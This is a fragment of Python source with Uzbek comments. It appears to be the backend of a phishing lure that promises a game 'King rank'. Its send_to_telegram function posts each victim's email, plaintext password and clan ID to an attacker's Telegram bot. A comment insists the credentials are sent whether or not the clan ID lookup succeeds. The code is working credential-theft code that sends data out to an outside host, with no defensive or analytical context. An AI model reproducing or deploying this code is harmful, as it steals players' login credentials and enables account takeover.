...
def send_to_telegram(email, password, clan_id="Mavjud emas"):
    """Har doim Telegramga xabar yuborish."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"✅ KING RANK KIRITILDI!\n Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        # MUHIM: json=payload ishlatamiz, data=payload emas!
        response = requests.post(url, json=payload, timeout=5)
        if response.status_code == 200:
            logging.info("✅ Telegram xabar yuborildi!")
        else:
            logging.warning(f"❌ Telegram xatosi: {response.status_code}")
...
def check_clan_id(token, email, password):
    """ClanId ni tekshirish va natijani Telegramga yuborish."""
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "okhttp/3.12.13",
        "Content-Type": "application/json"
    ...
    payload = {"data": None}
    clan_id_to_send = "Mavjud emas" # Default qiymat
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            if clan_id:
                clan_id_to_send = clan_id
                logging.info(f"🛡️ ClanId topildi: {clan_id}")
            else:
                logging.info("ℹ️ ClanId topilmadi")
    except requests.exceptions.RequestException as e:
        logging.error(f"❌ ClanId xatosi: {e}")
    
    # Muhim: ClanId bo'ladimi-yo'qmi, baribir yuborish!
    send_to_telegram(email, password, clan_id_to_send)
